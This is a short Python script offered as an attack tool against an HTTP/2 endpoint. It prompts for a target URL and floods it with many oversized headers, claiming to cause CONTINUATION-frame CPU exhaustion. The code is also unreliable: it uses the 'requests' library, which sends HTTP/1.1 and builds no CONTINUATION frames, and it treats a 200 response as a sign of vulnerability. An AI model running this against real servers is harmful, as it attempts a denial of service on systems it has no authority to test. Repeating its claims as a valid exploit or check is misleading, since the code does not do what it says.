import requests

def send_http2_request(url, headers):
    # Crafted HTTP/2 request with excessive CONTINUATION frames
    response = requests.post(url, headers=headers, stream=True)
    return response

def main():
    # Prompt user for endpoint URL
    url = input("Enter the URL of the HTTP/2 endpoint: ")

    # Prompt user for excessive headers
    num_headers = int(input("Enter the number of excessive headers to send: "))

    # Craft excessive headers
    headers = {}
    for i in range(num_headers):
        headers[f'Header-{i}'] = 'A' * 1024  # Exceeding MaxHeaderBytes

    print("\nSending HTTP/2 request...")
    response = send_http2_request(url, headers)

    # Display response status code
    print(f"\nResponse Status Code: {response.status_code}")
    if response.status_code == 200:
        print("\nSuccess! The server may be vulnerable to the HTTP/2 CPU exhaustion attack.")
    else:
        print("\nError! The server may not be vulnerable or there was an issue with the request.")

if __name__ == "__main__":
    main()
